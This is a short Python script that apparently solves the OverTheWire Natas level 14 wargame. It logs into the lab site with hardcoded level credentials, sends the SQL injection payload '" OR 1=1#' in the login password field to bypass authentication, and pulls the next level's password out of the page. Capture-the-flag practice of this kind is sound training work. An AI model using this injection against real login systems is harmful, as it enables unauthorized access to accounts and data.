#!/usr/bin/env python3

import requests
import re

req = requests.Session()

username = "natas14"
password = "Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1"
url = "http://%s.natas.labs.overthewire.org/" % username

data = {"username":"admin","password":'" OR 1=1#'}
req_post = req.post(url,auth=(username,password),data=data)
# print(req_post.text)


nxt_pass = re.findall("The password for natas15 is (.*)<br>",req_post.text)
print(nxt_pass[0])
